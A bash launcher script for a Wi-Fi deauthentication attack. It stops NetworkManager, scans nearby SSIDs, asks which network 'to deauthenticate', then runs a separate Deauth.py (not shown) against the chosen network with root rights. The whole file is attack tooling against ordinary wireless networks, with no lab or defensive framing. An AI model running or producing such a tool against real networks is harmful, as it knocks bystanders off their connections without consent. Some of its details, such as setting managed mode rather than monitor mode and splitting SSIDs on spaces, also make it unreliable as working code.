#!/bin/bash

# Function to check and stop NetworkManager
stop_network_manager() {
    if systemctl is-active --quiet NetworkManager; then
        echo "NetworkManager is running. Stopping it to prevent interference..."
        sudo systemctl stop NetworkManager
    else
        echo "NetworkManager is already stopped."
    fi
}

# Function to disconnect from the current network
disconnect_wifi() {
    echo "Wifi disconnecting..."
    sudo nmcli dev disconnect wlp0s20f3
}

# Function to switch the Wi-Fi interface to managed mode
set_interface_managed() {
    echo "Setting the interface wlp0s20f3 to managed mode for scanning..."
    sudo ip link set wlp0s20f3 down
    sudo iw dev wlp0s20f3 set type managed
    sudo ip link set wlp0s20f3 up
}

# Function to scan for available networks and display SSIDs
scan_networks() {
    echo "Scanning for available networks..."
    scan_output=$(sudo iw dev wlp0s20f3 scan)
    # List unique SSIDs
    unique_ssids=$(echo "$scan_output" | grep "SSID" | awk '{print $2}' | sort | uniq)

    echo "Available networks:"
    count=1
    declare -A ssid_map
    for ssid in $unique_ssids; do
        echo "$count) SSID: $ssid"
        ssid_map[$count]=$ssid
        count=$((count+1))
    done

    echo "Enter the number of the network to deauthenticate:"
    read network_number

    selected_ssid=${ssid_map[$network_number]}
    if [ -z "$selected_ssid" ]; then
        echo "Invalid selection or no network found. Exiting..."
        exit 1
    fi

    echo "Selected network: $selected_ssid"
}

# Function to run the deauthentication Python script
run_deauth() {
    echo "Running Deauth.py for $selected_ssid..."
    sudo python3 /home/david/Desktop/deauth/Deauth.py "$selected_ssid"
}

# Function to restore network settings and restart NetworkManager
restore_network() {
    echo "Reconnecting interface to managed mode..."
    sudo ip link set wlp0s20f3 down
    sudo iw dev wlp0s20f3 set type managed
    sudo ip link set wlp0s20f3 up

    echo "Starting NetworkManager again..."
    sudo systemctl start NetworkManager
    echo "Connected | End of script"
}

# Main execution flow
stop_network_manager
disconnect_wifi
set_interface_managed
scan_networks
run_deauth
restore_network
